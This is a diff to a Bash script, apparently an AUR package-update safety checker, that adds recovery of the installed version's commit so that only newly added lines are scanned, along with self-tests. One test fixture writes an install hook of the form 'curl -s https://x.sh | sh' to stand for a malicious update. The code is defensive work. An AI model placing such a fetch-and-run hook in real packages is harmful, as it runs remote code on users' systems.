@@ -278,6 +278,60 @@ _installed_matches() {
   return 1
 }
 
+# Given a cloned dir and an INSTALLED version string "epoch:pkgver-pkgrel" (epoch
+# optional, as pacman prints it), walk origin/<branch> history and print the
+# OLDEST commit whose .SRCINFO matches that version, or empty if none. This is
+# baseline recovery: it gives the missing-cache path a real diff base (the
+# commit the installed package was built from) instead of a whole-file scan, so
+# pre-existing .install hooks (ventoy-bin, vscode-bin) no longer false-positive
+# — only DELTA additions (the campaign vector) are scanned.
+#
+# OLDEST-match policy: if several commits share the installed pkgver (e.g. a
+# malicious push keeping pkgver identical across commits), the oldest match
+# maximizes diff coverage and surfaces any intervening commit for review. This
+# is conservative-by-design: it may over-report on a benign re-commit at the
+# same version, never under-report.
+#
+# Mechanism: cat-file --batch reads every commit's .SRCINFO in ONE process
+# (~80ms for an 858-commit repo; per-commit `git show` is ~25x slower). The
+# batch stream echoes the BLOB's sha in its header, NOT the commit's, so the
+# commit↔.SRCINFO association is lost — restore it by passing the oldest-first
+# commit list into awk and mapping by BLOCK INDEX: the Nth <sha> blob block
+# corresponds to the Nth commit in `commits`. Whitespace-tolerant version
+# extraction mirrors _installed_matches (some packages ship space-indented
+# .SRCINFO, e.g. opera-developer). A commit whose .SRCINFO is `missing` advances
+# the block index without contributing a version.
+find_baseline_commit() {
+  local dir="$1" want="$2" branch="${3:-${AUR_REMOTE_BRANCH}}" commits
+  commits=$(git -C "$dir" rev-list --reverse "origin/${branch}" 2>/dev/null) || return 1
+  [[ -n "$commits" ]] || return 0
+  # DASH/COLON passed as awk vars to avoid quoting an inline "-" literal.
+  printf '%s\n' "$commits" | sed 's/$/:.SRCINFO/' \
+    | git -C "$dir" cat-file --batch 2>/dev/null \
+    | awk -v want="$want" -v commits="$commits" -v DASH=- -v COLON=: '
+      BEGIN { nc = split(commits, C, "\n") }
+      function emit() {
+        if (ver != "" && rel != "") {
+          full = (epoch != "" ? epoch COLON : "") ver DASH rel
+          if (full == want && out == "") out = C[bi]
+        }
+        ver = rel = epoch = ""
+      }
+      /^[0-9a-f]{40} blob / { if (bi > 0) emit(); bi++; next }
+      # cat-file --batch prints "<full-rev>:<path> missing" for absent objects
+      # (not "<sha> missing"), so anchor on the trailing " missing" — a sha-led
+      # regex silently fails to match, desyncing the block index by one per
+      # missing commit and mapping every later commit to the wrong (older) one.
+      / missing$/             { if (bi > 0) emit(); bi++; ver = rel = epoch = ""; next }
+      {
+        if      ($0 ~ /^[[:space:]]*pkgver =/) { sub(/^[[:space:]]*pkgver = */, ""); ver = $0 }
+        else if ($0 ~ /^[[:space:]]*pkgrel =/) { sub(/^[[:space:]]*pkgrel = */, ""); rel = $0 }
+        else if ($0 ~ /^[[:space:]]*epoch =/)  { sub(/^[[:space:]]*epoch = */, "");  epoch = $0 }
+      }
+      END { emit(); if (out != "") print out }
+    '
+}
+
 # Stage the current origin/master tip for a pkgbase as a candidate to accept
 # after a successful build. Only during `gate` (AUR_SAFE_STAGING=1); `check` is
 # read-only inspection and never stages. Appends to the run manifest so `accept`
@@ -289,44 +343,50 @@ _stage_if_gating() {
   printf '%s\n' "$pkgbase" >>"$MANIFEST_FILE"
 }
 
-# Clone <pkg> from AUR (AUR_URL) into a temp dir, run the HARD rule set against
-# PKGBUILD + *.install + *.sh, emit findings, and clean up. Shared by `audit`
-# (advisory, new installs) and by `check_pkg`'s missing-cache fallback
-# (review-level, uncached updates). Sets globals on success:
-#   SCAN_HITS    1 if any hard rule fired, else 0
-#   SCAN_CONTENT concatenated file contents (caller may stash for `explain`)
+# Clone <pkg> from AUR (AUR_URL) into a temp dir, WITHOUT cleaning up. The
+# CALLER owns `rm -rf "${_CLONE_DIR%/*}"` on the set path. Validates a PKGBUILD
+# exists and captures the gate-time tip (the finding-1.2 TOCTOU invariant — see
+# _stage_*). Sets globals on success:
 #   SCAN_SHA     origin/<branch> tip at clone time (gate-time tip X, for staging)
 #   SCAN_URL     remote.origin.url (provenance for the staged ref)
-# Returns 0 on success regardless of hits; non-zero if the clone or read failed
-# (caller decides the exit-code policy). Review rules are deliberately NOT run:
-# a whole-file scan (no baseline) would fire pip/cargo/go on every legit package
-# that legitimately uses them — the same reason `audit` is hard-rules-only.
-scan_clone() {
-  local pkg="$1" tmp content
-  SCAN_HITS=0; SCAN_CONTENT=""; SCAN_SHA=""; SCAN_URL=""
+# Takes the dir output BY NAMEREF (_CLONE_DIR) — NOT via stdout — because a
+# command substitution would run this in a subshell and lose the SCAN_SHA/SCAN_URL
+# global assignments (which is the exact TOCTOU-invariant data staging needs).
+# Returns 1 on clone/PKGBUILD failure (temp dir already removed). `--` guards
+# against option injection if pkg/AUR_URL start with '-' (pkg is validated at
+# check_pkg entry; defense-in-depth).
+_clone_aur() {
+  local -n _CLONE_DIR=$1
+  local pkg="$2" tmp
+  SCAN_SHA=""; SCAN_URL=""
+  _CLONE_DIR=""
   tmp=$(mktemp -d) || return 1
   log "$(c_dim "→ cloning $pkg from AUR to $tmp")"
-  # `--` guards against option injection if pkg/AUR_URL start with '-' (pkg is
-  # validated at the check_pkg entry point, but defense-in-depth).
   if ! git clone -q -- "${AUR_URL}/${pkg}.git" "$tmp/$pkg" 2>/dev/null; then
     rm -rf "$tmp"; return 1
   fi
   # A valid AUR repo must have a PKGBUILD; a repo with only .install/.sh is not
   # a real package and scanning its fragments would be noise. Fail (return 1).
   [[ -f "$tmp/$pkg/PKGBUILD" ]] || { rm -rf "$tmp"; return 1; }
-  # Capture the gate-time tip BEFORE cleanup so the missing-cache path can stage
-  # it (the finding-1.2 TOCTOU guarantee: a window-commit X' pushed between this
-  # scan and the helper's own fetch surfaces as fresh delta on the next gate,
-  # rather than being auto-seeded as the trusted baseline).
   SCAN_SHA=$(git -C "$tmp/$pkg" rev-parse "origin/${AUR_REMOTE_BRANCH}" 2>/dev/null || true)
   SCAN_URL=$(git -C "$tmp/$pkg" config --get remote.origin.url 2>/dev/null || true)
+  _CLONE_DIR="$tmp/$pkg"
+}
+
+# Absolute (whole-file) scan of a cloned dir against the HARD rule set only.
+# Sets globals: SCAN_HITS (1 if any hard rule fired, else 0), SCAN_CONTENT
+# (concatenated PKGBUILD+*.install+*.sh, caller may stash for `explain`).
+# Returns 1 if no content could be read, else 0. Review rules are deliberately
+# NOT run: a whole-file scan has no baseline, so pip/cargo/go would fire on
+# every legit package that uses them — the same reason `audit` is hard-only.
+_scan_whole_pkg() {
+  local dir="$1" content
+  SCAN_HITS=0; SCAN_CONTENT=""
   shopt -s nullglob
-  content=$(cat "$tmp/$pkg"/PKGBUILD "$tmp/$pkg"/*.install "$tmp/$pkg"/*.sh 2>/dev/null || true)
+  content=$(cat "$dir"/PKGBUILD "$dir"/*.install "$dir"/*.sh 2>/dev/null || true)
   shopt -u nullglob
-  rm -rf "$tmp"
   [[ -z "$content" ]] && return 1
   SCAN_CONTENT="$content"
-
   local i hits
   for i in "${!RULE_NAMES[@]}"; do
     local name="${RULE_NAMES[$i]}" pat="${RULE_PATTERNS[$i]}"
@@ -338,6 +398,19 @@ scan_clone() {
     fi
   done
   (( SCAN_HITS )) || log "  $(c_green "clean") no hard-rule matches"
+  return 0
+}
+
+# Clone + whole-file hard-rule scan + cleanup. Thin wrapper for `audit`
+# (advisory new installs) and the missing-cache FALLBACK tier (no baseline
+# commit found). Sets SCAN_HITS/SCAN_CONTENT (from _scan_whole_pkg) and
+# SCAN_SHA/SCAN_URL (from _clone_aur). Returns 0 on success regardless of hits;
+# non-zero if clone/read failed (caller decides exit-code policy).
+scan_clone() {
+  local pkg="$1" dir
+  _clone_aur dir "$pkg" || return 1
+  _scan_whole_pkg "$dir" || { rm -rf "${dir%/*}"; return 1; }
+  rm -rf "${dir%/*}"
   return 0
 }
 
@@ -359,69 +432,18 @@ _stage_scan_if_gating() {
 # core: check a single (cached) package
 # returns: 0 clean | 1 hard | 2 review
 ###############################################################################
-check_pkg() {
-  local pkg="$1"
-  # Validate pkg name (used in git clone URL + flag-stash paths). cmd_audit
-  # validates at its own entry; check_pkg must too — it's reachable from
-  # cmd_check with raw user args. Reject, don't die: a gate loop shouldn't
-  # abort on one bad name.
-  [[ "$pkg" =~ ^[a-z0-9@._+-]+$ ]] \
-    || { log "$(c_dim "skip") $pkg — invalid package name"; return 0; }
-  local dir
-  if ! dir=$(find_pkg_dir "$pkg"); then
-    # No cache clone => no diff baseline. A -Qua update with no cache dir used
-    # to silently `return 0` (clean), letting a malicious update through ungated
-    # while the gate still printed "all clear". Fall back to the same absolute-
-    # rule scan `audit` uses (clone + scan PKGBUILD/.install/.sh), but at REVIEW
-    # level: a hard-rule hit returns 2 (wrapper prompts for consent), clean
-    # returns 0. Hard rules only — review rules on a whole-file scan would fire
-    # on every legit pip/cargo package (REVIEWER-NOTES §3). The scan-time tip is
-    # staged so `accept` promotes the AUDITED commit (finding-1.2 TOCTOU fix);
-    # if the clone fails there is zero signal AND no tip to stage, so surface
-    # for consent (2) without staging rather than silently passing.
-    log "  $(c_dim "(no cache clone — advisory scan, no diff baseline)")"
-    if ! scan_clone "$pkg"; then
-      log "  $(c_yellow "review") $pkg — could not clone (offline? AUR down?); surfacing for consent"
-      return 2
-    fi
-    if (( SCAN_HITS )); then
-      printf '%s\n' "$SCAN_CONTENT" >"$STATE_DIR/flag.${pkg}.diff"
-      ln -sf "flag.${pkg}.diff" "$STATE_DIR/last-flag.diff" 2>/dev/null || true
-      printf '%s\n' "$pkg" >"$STATE_DIR/last-flag.pkg"
-      log "  $(c_yellow "review") $pkg — hard-rule hit(s) in uncached PKGBUILD; consent required"
-      log "  $(c_dim "scan stashed: $STATE_DIR/flag.${pkg}.diff  (run: aur-safe explain $pkg)")"
-      _stage_scan_if_gating "$pkg"
-      return 2
-    fi
-    log "  $(c_green "ok")    $pkg — no hard-rule matches in uncached PKGBUILD"
-    _stage_scan_if_gating "$pkg"
-    return 0
-  fi
-  local pkgbase="${dir##*/}"
-
-  # Best-effort fetch; if offline, proceed with whatever origin/master we have.
-  git -C "$dir" fetch -q origin 2>/dev/null \
-    || log "$(c_yellow "warn:") fetch failed for $pkg (offline?); diffing cached origin/${AUR_REMOTE_BRANCH}"
-
-  # No candidate commit => nothing to review.
-  if ! git -C "$dir" rev-parse --verify -q "origin/${AUR_REMOTE_BRANCH}" >/dev/null; then
-    log "$(c_dim "skip") $pkg — no origin/${AUR_REMOTE_BRANCH}"
-    return 0
-  fi
-
-  # Trust anchor: aur-safe's own accepted ref (finding 1.2). Seeded from the
-  # helper-cache HEAD on first contact, then frozen — a later manipulated or
-  # stale helper HEAD can no longer silently move the diff baseline. Falls back
-  # to HEAD only if the seed itself can't be resolved.
-  local base_ref
-  base_ref=$(accepted_ref "$dir" "$pkgbase") || base_ref=HEAD
-
-  # No changes vs the accepted ref => clean. Do NOT stage (nothing to accept).
-  if [[ -z "$(git -C "$dir" diff --name-only "${base_ref}..origin/${AUR_REMOTE_BRANCH}" 2>/dev/null)" ]]; then
-    log "$(c_green "ok")    $pkg — no source changes (version bump only?)"
-    return 0
-  fi
-
+# Diff-based rule pipeline: run the FULL rule set (hard + review) against the
+# ADDED lines of <base_ref>..origin/<branch> in $dir, plus the structural checks
+# (new/modified .install, new binaries, maintainer/source domain drift). Returns
+# 0 clean | 1 hard | 2 review. Stashes the flagged diff on any hit (for
+# `explain`). Does NOT stage — staging is the caller's job and differs by path
+# (cached uses _stage_if_gating with a cache dir; missing-cache uses
+# _stage_scan_if_gating with the captured SCAN_SHA). Shared by the cached path
+# (check_pkg, base = accepted trust anchor) and baseline recovery (missing-cache
+# path, base = installed-version commit from find_baseline_commit) so the two
+# diff paths can never drift.
+scan_diff_rules() {
+  local pkg="$1" dir="$2" base_ref="$3"
   local added
   added=$(cd "$dir" && diff_added "${base_ref}..origin/${AUR_REMOTE_BRANCH}")
 
@@ -521,13 +543,126 @@ check_pkg() {
   if (( review_hits )); then
     stash_flag "$pkg" "$dir" "$base_ref"
     log "  $(c_dim "diff stashed: $STATE_DIR/flag.${pkg}.diff  (run: aur-safe explain $pkg)")"
-    _stage_if_gating "$pkgbase" "$dir"
     return 2
   fi
-
-  log "$(c_green "ok")    $pkg"
-  _stage_if_gating "$pkgbase" "$dir"
   return 0
+}
+
+# Gate an update with NO cache clone. Two tiers:
+#   1. BASELINE RECOVERY (preferred): if the installed package is at a version
+#      present in AUR history, diff installed-commit..origin/master and run the
+#      FULL rule set via scan_diff_rules — same precision as the cached path
+#      (exit 1 hard / 2 review / 0 clean). This eliminates the whole-file false
+#      positives that motivated review-only-on-missing-cache (pre-existing
+#      .install hooks on ventoy-bin etc. are NOT in the delta).
+#   2. WHOLE-FILE FALLBACK: if no commit matches the installed version (or the
+#      version can't be queried), clone + hard-rules-only absolute scan at
+#      review level (2 on hit / 0 on clean) — review rules on a baseline-less
+#      scan would fire on every legit pip/cargo package (REVIEWER-NOTES §3).
+# Clone failure always returns 2 (zero signal — surface for consent, never
+# silently pass). Staging: the scan-time tip (SCAN_SHA, captured at clone) is
+# staged on clean/review but NOT hard-fail (a blocked update never reaches the
+# helper, so nothing to accept) — mirrors the cached path's _stage_if_gating
+# discipline and preserves the finding-1.2 TOCTOU guarantee (the AUDITED commit
+# is what `accept` would promote, not the helper's later fetch).
+missing_cache_gate() {
+  local pkg="$1" dir want baseline rc
+  _clone_aur dir "$pkg" || {
+    log "  $(c_yellow "review") $pkg — could not clone (offline? AUR down?); surfacing for consent"
+    return 2
+  }
+  # Tier 1: baseline recovery. Need an installed version to match against.
+  want=$(_pacman_query "$pkg" | awk '{print $2}')
+  if [[ -n "$want" ]]; then
+    baseline=$(find_baseline_commit "$dir" "$want")
+    if [[ -n "$baseline" ]]; then
+      scan_diff_rules "$pkg" "$dir" "$baseline"; rc=$?
+      rm -rf "${dir%/*}"
+      case $rc in
+        1) return 1 ;;   # hard-fail: do NOT stage (blocked update → no build)
+        2) _stage_scan_if_gating "$pkg"; return 2 ;;
+        *) _stage_scan_if_gating "$pkg"
+           log "$(c_green "ok")    $pkg — no flagged changes (baseline-recovery diff)"
+           return 0 ;;
+      esac
+    fi
+    log "  $(c_dim "(installed version not found in AUR history — whole-file fallback)")"
+  else
+    log "  $(c_dim "(no cache clone — could not query installed version; whole-file fallback)")"
+  fi
+
+  # Tier 2: whole-file absolute scan, hard-rules-only, review level.
+  _scan_whole_pkg "$dir"; rm -rf "${dir%/*}"
+  if (( SCAN_HITS )); then
+    printf '%s\n' "$SCAN_CONTENT" >"$STATE_DIR/flag.${pkg}.diff"
+    ln -sf "flag.${pkg}.diff" "$STATE_DIR/last-flag.diff" 2>/dev/null || true
+    printf '%s\n' "$pkg" >"$STATE_DIR/last-flag.pkg"
+    log "  $(c_yellow "review") $pkg — hard-rule hit(s) in uncached PKGBUILD; consent required"
+    log "  $(c_dim "scan stashed: $STATE_DIR/flag.${pkg}.diff  (run: aur-safe explain $pkg)")"
+    _stage_scan_if_gating "$pkg"
+    return 2
+  fi
+  log "$(c_green "ok")    $pkg — no hard-rule matches in uncached PKGBUILD"
+  _stage_scan_if_gating "$pkg"
+  return 0
+}
+
+check_pkg() {
+  local pkg="$1"
+  # Validate pkg name (used in git clone URL + flag-stash paths). cmd_audit
+  # validates at its own entry; check_pkg must too — it's reachable from
+  # cmd_check with raw user args. Reject, don't die: a gate loop shouldn't
+  # abort on one bad name.
+  [[ "$pkg" =~ ^[a-z0-9@._+-]+$ ]] \
+    || { log "$(c_dim "skip") $pkg — invalid package name"; return 0; }
+  local dir
+  if ! dir=$(find_pkg_dir "$pkg"); then
+    # No cache clone => baseline recovery: clone fresh, find the installed
+    # version's commit in AUR history, and diff installed..origin/master at full
+    # precision (hard/review/clean like the cached path). Falls back to a
+    # whole-file hard-rules-only scan if the installed version isn't in history.
+    # See missing_cache_gate for the two-tier model and staging discipline.
+    missing_cache_gate "$pkg"
+    return $?
+  fi
+  local pkgbase="${dir##*/}"
+
+  # Best-effort fetch; if offline, proceed with whatever origin/master we have.
+  git -C "$dir" fetch -q origin 2>/dev/null \
+    || log "$(c_yellow "warn:") fetch failed for $pkg (offline?); diffing cached origin/${AUR_REMOTE_BRANCH}"
+
+  # No candidate commit => nothing to review.
+  if ! git -C "$dir" rev-parse --verify -q "origin/${AUR_REMOTE_BRANCH}" >/dev/null; then
+    log "$(c_dim "skip") $pkg — no origin/${AUR_REMOTE_BRANCH}"
+    return 0
+  fi
+
+  # Trust anchor: aur-safe's own accepted ref (finding 1.2). Seeded from the
+  # helper-cache HEAD on first contact, then frozen — a later manipulated or
+  # stale helper HEAD can no longer silently move the diff baseline. Falls back
+  # to HEAD only if the seed itself can't be resolved.
+  local base_ref
+  base_ref=$(accepted_ref "$dir" "$pkgbase") || base_ref=HEAD
+
+  # No changes vs the accepted ref => clean. Do NOT stage (nothing to accept).
+  if [[ -z "$(git -C "$dir" diff --name-only "${base_ref}..origin/${AUR_REMOTE_BRANCH}" 2>/dev/null)" ]]; then
+    log "$(c_green "ok")    $pkg — no source changes (version bump only?)"
+    return 0
+  fi
+
+  # Run the shared diff-based rule pipeline (hard + review + structural). Staging
+  # stays here, NOT in scan_diff_rules, because the cached path stages via the
+  # cache dir (_stage_if_gating) while the missing-cache path stages via the
+  # captured SCAN_SHA (_stage_scan_if_gating). On hard-fail (1) do NOT stage: a
+  # blocked update never reaches the helper, so there's nothing to accept.
+  scan_diff_rules "$pkg" "$dir" "$base_ref"; local rc=$?
+  case $rc in
+    2) _stage_if_gating "$pkgbase" "$dir"; return 2 ;;
+    0) _stage_if_gating "$pkgbase" "$dir"
+       log "$(c_green "ok")    $pkg"
+       return 0 ;;
+    *) return 1 ;;
+  esac
 }
 
 ###############################################################################
@@ -1064,11 +1199,13 @@ cmd_selftest() {
   # --- missing-cache fallback (the ventoy blindspot) -----------------------
   # An update in yay -Qua whose cache clone is gone used to `return 0` (clean)
   # with NO scan — a malicious update sailed through ungated while the gate
-  # printed "all clear". check_pkg now falls back to scan_clone (the audit
-  # engine) at REVIEW level: hard-rule hit → exit 2 (consent), clean → exit 0,
-  # clone failure → exit 2 (no silent passthrough). The scan-time tip is staged
-  # so `accept` promotes the AUDITED commit (finding-1.2 TOCTOU fix). Exercises
-  # routing + exit-code mapping + staging against local file:// fixtures, no net.
+  # printed "all clear". check_pkg now routes to missing_cache_gate: clone fresh,
+  # and EITHER baseline-recover (diff installed-version..origin/master at full
+  # precision) OR fall back to a whole-file hard scan. These tests exercise the
+  # FALLBACK tier (no installed version reported: _AUR_TEST_Q=""), which is
+  # review-level: hard hit → 2, clean → 0, clone fail → 2. The scan-time tip is
+  # staged so `accept` promotes the AUDITED commit (finding-1.2 TOCTOU fix).
+  # Baseline-recovery tier is exercised in its own section below.
   log ""
   log "  $(c_dim "-- missing-cache fallback --")"
   local _fbx _fsd _osr _osd2 _ost2 _omf2 _csha _esha
@@ -1128,6 +1265,140 @@ cmd_selftest() {
   if [ -f "$STATE_DIR/flag.evil-pkg.diff" ] && [ -L "$STATE_DIR/last-flag.diff" ]; then
     log "  $(c_green "PASS") uncached-review-stashes-scan"; pass=$((pass+1))
   else log "  $(c_red "FAIL") uncached-review-stashes-scan"; fail=$((fail+1)); fi
+
+  # --- baseline recovery (the precision upgrade) ---------------------------
+  # The whole-file fallback above fires on PRE-EXISTING legit .install hooks
+  # (ventoy-bin, vscode-bin) because it has no diff baseline. Baseline recovery
+  # finds the installed version's commit in AUR history and diffs
+  # installed-commit..origin/master, so only DELTA additions are scanned — same
+  # precision as the cached path. These fixtures need real git history with a
+  # committed .SRCINFO at each version so find_baseline_commit can match.
+  # _pacman_query is now NAME-AWARE and reports an installed version, which
+  # routes missing_cache_gate to its tier-1 baseline-recovery branch.
+  log ""
+  log "  $(c_dim "-- baseline recovery --")"
+  # Helper: build a bare fixture from a list of (ver, PKGBUILD-extra, files) specs.
+  # Each spec commits PKGBUILD + .SRCINFO at that version. Files (name=content) are
+  # committed with the spec so diffs are realistic (new-file detection works).
+  _bl_bld() {  # $1=srcroot $2=pkg  $3..=specs "ver@file1=content;file2=content"
+    local root="$1" pkg="$2" s ver files f pair
+    shift 2
+    mkdir -p "$root/src/$pkg"
+    ( cd "$root/src/$pkg" || exit 1
+      git -c init.defaultBranch=master init -q
+      git config user.email t@t; git config user.name t
+      for s in "$@"; do
+        ver="${s%%@*}"; files="${s#*@}"
+        printf 'pkgname=%s\npkgver=%s\npkgrel=1\n' "$pkg" "$ver" > PKGBUILD
+        # carry forward any prior install= line is the caller's job via files
+        printf 'pkgbase = %s\n\tpkgver = %s\n\tpkgrel = 1\n\npkgname = %s\n' "$pkg" "$ver" "$pkg" > .SRCINFO
+        # apply file specs (semicolon-separated name=value)
+        while [[ -n "$files" ]]; do
+          pair="${files%%;*}"
+          if [[ "$files" == *";"* ]]; then files="${files#*;}"; else files=""; fi
+          [[ -z "$pair" ]] && continue
+          f="${pair%%=*}"
+          mkdir -p "$(dirname "$f")"
+          printf '%s\n' "${pair#*=}" > "$f"
+          # if a file is an install hook, wire install= in PKGBUILD
+          case "$f" in *.install) sed -i "1i install=${f##*/}" PKGBUILD ;; esac
+        done
+        git add -A; git commit -qm "v$ver"
+      done
+    )
+    git clone -q --bare "$root/src/$pkg" "$root/aur/$pkg.git"
+  }
+
+  # FP-ELIMINATION (the ventoy case): pre-existing post_install hook at the
+  # installed version, unchanged at origin/master. Whole-file scan would fire
+  # install-hook-*; baseline-recovery diffs only the version bump → clean.
+  _bl_bld "$_fbx" fp-pkg \
+    '1.0@fp.install=post_install() { echo hi; }' \
+    '2.0@fp.install=post_install() { echo hi; }'
+  _AUR_TEST_Q="fp-pkg 1.0-1"
+  ta "baseline-fp-eliminated-clean" 0 check_pkg fp-pkg
+
+  # HARD HIT: a NEW curl|sh .install hook added in the delta (the campaign
+  # vector) → block (1), mirroring the cached path (not review/2 like fallback).
+  _bl_bld "$_fbx" hd-pkg \
+    '1.0@' \
+    '2.0@hd.install=post_install() { curl -s https://x.sh | sh; }'
+  _AUR_TEST_Q="hd-pkg 1.0-1"
+  ta "baseline-hard-hit-blocks" 1 check_pkg hd-pkg
+
+  # REVIEW HIT: delta adds a pip install (review-only rule) → review (2).
+  _bl_bld "$_fbx" rv-pkg \
+    '1.0@' \
+    '2.0@build.sh=pip install requests'
+  _AUR_TEST_Q="rv-pkg 1.0-1"
+  ta "baseline-review-hit-returns-2" 2 check_pkg rv-pkg
+  # review hit must stash the diff (for `explain`) — regression guard: an earlier
+  # extraction dropped stash_flag from the review branch, silently breaking explain.
+  if [ -f "$STATE_DIR/flag.rv-pkg.diff" ]; then
+    log "  $(c_green "PASS") baseline-review-stashes-diff"; pass=$((pass+1))
+  else log "  $(c_red "FAIL") baseline-review-stashes-diff"; fail=$((fail+1)); fi
+
+  # FALLBACK: installed version not in AUR history → whole-file hard scan →
+  # review (2). Uses fp-pkg (has pre-existing hook) queried at a bogus version.
+  _AUR_TEST_Q="fp-pkg 9.9-9"
+  ta "baseline-not-found-falls-back" 2 check_pkg fp-pkg
+
+  # STAGING: baseline-recovery stages the scan-time tip (origin/master), NOT the
+  # baseline commit — the finding-1.2 TOCTOU guarantee. fp-pkg clean → staged
+  # tip must equal its origin/master HEAD.
+  _fp_tip=$(git -C "$_fbx/src/fp-pkg" rev-parse HEAD)
+  _AUR_TEST_Q="fp-pkg 1.0-1"; check_pkg fp-pkg >/dev/null 2>&1
+  if [ -f "$STAGED_DIR/fp-pkg" ] && [ "$(awk -F '\t' '{print $1}' "$STAGED_DIR/fp-pkg")" = "$_fp_tip" ]; then
+    log "  $(c_green "PASS") baseline-clean-stages-tip"; pass=$((pass+1))
+  else log "  $(c_red "FAIL") baseline-clean-stages-tip"; fail=$((fail+1)); fi
+  # hard-fail (hd-pkg) does NOT stage: a blocked update never reaches the helper.
+  _AUR_TEST_Q="hd-pkg 1.0-1"; check_pkg hd-pkg >/dev/null 2>&1
+  if [ ! -f "$STAGED_DIR/hd-pkg" ]; then
+    log "  $(c_green "PASS") baseline-hard-hit-no-stage"; pass=$((pass+1))
+  else log "  $(c_red "FAIL") baseline-hard-hit-no-stage"; fail=$((fail+1)); fi
+
+  # MISSING-.SRCINFO commit in history: find_baseline_commit must map the
+  # block index correctly across a `cat-file --batch` "missing" block. Earlier
+  # the awk regex anchored on "^[0-9a-f]{40} missing" but git prints
+  # "<full-rev>:.SRCINFO missing", so the regex never matched, the index
+  # desynced by one, and the lookup returned an OLDER (wrong) commit. This is
+  # the conservative failure (over-reports, never under-reports) but it's still
+  # wrong. Build a 3-commit repo where the MIDDLE commit lacks .SRCINFO.
+  # _bl_bld always commits .SRCINFO, so hand-build this one; find_baseline_commit
+  # is called on a CLONE (origin/master present), matching how missing_cache_gate
+  # uses it — so clone to a temp dir and run the assertion there.
+  _ms_src="$_fbx/src/ms-pkg"; mkdir -p "$_ms_src"
+  ( cd "$_ms_src" || exit 1
+    git -c init.defaultBranch=master init -q
+    git config user.email t@t; git config user.name t
+    printf 'pkgname=ms-pkg\npkgver=1.0\npkgrel=1\n' > PKGBUILD
+    printf 'pkgbase = ms-pkg\n\tpkgver = 1.0\n\tpkgrel = 1\n\npkgname = ms-pkg\n' > .SRCINFO
+    git add -A; git commit -qm v1.0
+    # middle commit: NO .SRCINFO (the desync trigger)
+    printf 'pkgname=ms-pkg\npkgver=2.0\npkgrel=1\n' > PKGBUILD
+    git rm -q .SRCINFO; git add -A; git commit -qm v2.0-no-srcinfo
+    # tip: .SRCINFO restored at v3
+    printf 'pkgname=ms-pkg\npkgver=3.0\npkgrel=1\n' > PKGBUILD
+    printf 'pkgbase = ms-pkg\n\tpkgver = 3.0\n\tpkgrel = 1\n\npkgname = ms-pkg\n' > .SRCINFO
+    git add -A; git commit -qm v3.0
+  )
+  _ms3=$(git -C "$_ms_src" rev-list --reverse master | sed -n '3p')
+  # find_baseline_commit reads origin/<branch>, so clone (creates origin/master)
+  # and run against the clone — same shape as _clone_aur inside missing_cache_gate.
+  _ms_clone=$(mktemp -d)
+  git clone -q "$_ms_src" "$_ms_clone/ms-pkg" 2>/dev/null
+  local _got
+  _got=$(find_baseline_commit "$_ms_clone/ms-pkg" "3.0-1")
+  if [ "$_got" = "$_ms3" ]; then
+    log "  $(c_green "PASS") baseline-skips-missing-srcinfo"; pass=$((pass+1))
+  else
+    log "  $(c_red "FAIL") baseline-skips-missing-srcinfo (expected ${_ms3:0:12}, got ${_got:0:12})"
+    fail=$((fail+1))
+  fi
+  rm -rf "$_ms_clone"
+
+  _AUR_TEST_Q=""
+  unset -f _bl_bld
 
   AUR_SAFE_STAGING=""
   AUR_URL="$_osr"; STATE_DIR="$_osd2"; STAGED_DIR="$_ost2"; MANIFEST_FILE="$_omf2"
